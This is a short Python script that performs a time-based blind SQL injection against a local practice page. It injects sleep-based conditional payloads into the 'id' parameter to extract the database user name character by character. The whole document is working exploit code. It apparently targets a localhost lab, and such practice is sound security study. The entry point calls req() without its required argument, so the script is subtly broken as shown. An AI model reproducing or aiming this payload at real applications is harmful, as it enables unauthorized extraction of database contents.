# -*- coding:utf-8 -*-
"""
@author: jim

"""
import requests

def req(str_len):
    string=''
    for k in range(1,str_len):
        for i in range(32, 127):
            sql_url = 'http://127.0.0.1/sqli/test/test4.php?id=1") and if(ascii(substring(user(),{0},1))<{1},sleep(3),1)--+'.format(str(k),str(i))
            print(sql_url+'\n')
            r = requests.get(sql_url)
            sec = r.elapsed.seconds
            if (sec > 2):
                string += chr(i-1)
                print(string)
                break










if __name__ == '__main__':
    req()

